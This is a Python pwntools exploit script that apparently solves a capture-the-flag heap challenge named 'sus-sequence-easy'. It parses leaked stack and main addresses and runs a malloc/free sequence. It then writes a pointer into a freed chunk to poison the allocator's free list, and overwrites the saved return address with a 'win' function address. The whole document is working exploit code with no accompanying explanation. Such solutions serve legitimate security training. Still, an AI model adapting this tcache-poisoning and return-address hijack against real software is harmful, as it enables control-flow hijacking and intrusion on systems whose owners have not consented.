from pwn import *

p = process("/challenge/sus-sequence-easy")

print(p.recvuntil(b"[LEAK] The local stack address of your allocations is at: "))

stack_leak = p.recvuntil(b".").split(b".")[0]
ptr_addr = int(stack_leak, 16)

print(hex(ptr_addr))

print(p.recvuntil(b"[LEAK] The address of main is at: "))

main_leak = p.recvuntil(b".").split(b".")[0]
main_addr = int(main_leak, 16)

win_addr = main_addr - 0xfd
rbp_addr = ptr_addr + 0x110
savedrip_addr = rbp_addr + 0x8

print(hex(main_addr))

print(p.clean())

p.sendline(b"malloc")
p.sendline(b"0")
p.sendline(b"8")

print(p.clean())

p.sendline(b"malloc")
p.sendline(b"1")
p.sendline(b"8")

print(p.clean())

p.sendline(b"malloc")
p.sendline(b"2")
p.sendline(b"8")

print(p.clean())

p.sendline(b"free")
p.sendline(b"2")

p.sendline(b"free")
p.sendline(b"1")

p.sendline(b"free")
p.sendline(b"0")

print(p.clean())

p.sendline(b"scanf")
p.sendline(b"0")
p.sendline(p64(savedrip_addr))

print()
print(p.clean())
print()

p.sendline(b"malloc")
p.sendline(b"3")
p.sendline(b"8")


print()
print(p.clean())
print()

p.sendline(b"malloc")
p.sendline(b"4")
p.sendline(b"8")

print()
print(p.clean())
print()

p.sendline(b"scanf")
p.sendline(b"4")
p.sendline(p64(win_addr))

print()
print(p.clean())
print()

p.sendline(b"quit")

p.interactive()

p.close()
